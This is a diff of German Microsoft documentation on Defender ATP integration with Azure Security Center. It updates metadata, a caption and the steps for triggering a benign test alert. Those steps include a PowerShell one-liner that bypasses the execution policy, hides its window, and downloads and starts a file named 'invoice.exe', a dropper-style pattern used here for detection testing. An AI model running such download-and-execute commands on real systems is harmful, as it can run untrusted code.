@@ -12,12 +12,12 @@ ms.tgt_pltfrm: na
 ms.workload: na
 ms.date: 09/24/2019
 ms.author: memildin
-ms.openlocfilehash: 46b9fe5c6a038aa98cf8df64c40bf8ea1747efec
-ms.sourcegitcommit: 609d4bdb0467fd0af40e14a86eb40b9d03669ea1
+ms.openlocfilehash: 13852acb39a420e2f0da84e18bef4df823c1fa78
+ms.sourcegitcommit: 1fa2bf6d3d91d9eaff4d083015e2175984c686da
 ms.translationtype: HT
 ms.contentlocale: de-DE
-ms.lasthandoff: 11/06/2019
-ms.locfileid: "73663609"
+ms.lasthandoff: 03/01/2020
+ms.locfileid: "78206264"
 ---
 # <a name="microsoft-defender-advanced-threat-protection-with-azure-security-center"></a>Microsoft Defender Advanced Threat Protection mit Azure Security Center
 
@@ -73,7 +73,7 @@ Klicken Sie unter der Integration von Servern in Microsoft Defender ATP auf **Go
 Wählen Sie **Security Center** > **Preise & Einstellungen** aus, und klicken Sie auf Ihr Abonnement, um anzuzeigen, ob die ATP-Integration von Microsoft Defender aktiviert ist.
 Hier können Sie die Integrationen anzeigen, die zurzeit aktiviert sind.
 
-  ![Einstellungsseite von Azure Security Center Threat Detection mit aktivierter Microsoft Defender ATP-Integration](media/security-center-wdatp/enable-integrations.png)
+  ![Einstellungsseite der Azure Security Center-Bedrohungserkennung mit aktivierter Microsoft Defender ATP-Integration](media/security-center-wdatp/enable-integrations.png)
 
 - Wenn Sie die Server bereits in die Standardebene von Azure Security Center integriert haben, müssen Sie keine weiteren Maßnahmen ergreifen. Azure Security Center integriert die Server automatisch in Microsoft Defender ATP. Das Onboarding kann bis zu 24 Stunden dauern.
 
@@ -95,12 +95,14 @@ Wenn Sie einen Proxy oder eine Firewall verwenden, der bzw. die anonymen Datenve
 
 So generieren Sie eine unbedenkliche Microsoft Defender ATP-Testwarnung:
 
-1. Verwenden Sie Remotedesktop, um auf eine Windows Server 2012 R2-VM oder eine Windows Server 2016-VM zuzugreifen. Öffnen Sie ein Eingabeaufforderungsfenster.
+1. Erstellen Sie einen Ordner „C:\test-MDATP-test“.
 
-2. Kopieren Sie an der Eingabeaufforderung den folgenden Befehl, und führen Sie ihn aus. Das Eingabeaufforderungsfenster wird automatisch geschlossen.
+1. Verwenden Sie Remotedesktop, um auf eine Windows Server 2012 R2-VM oder eine Windows Server 2016-VM zuzugreifen. Öffnen Sie ein Befehlszeilenfenster.
+
+1. Kopieren Sie an der Eingabeaufforderung den folgenden Befehl, und führen Sie ihn aus. Das Eingabeaufforderungsfenster wird automatisch geschlossen.
 
     ```
-    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe'); Start-Process 'C:\\test-WDATP-test\\invoice.exe'
+    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe'); Start-Process 'C:\\test-MDATP-test\\invoice.exe'
     ```
 
    ![Ein Eingabeaufforderungsfenster mit dem oben gezeigten Befehl](media/security-center-wdatp/image4.jpeg)
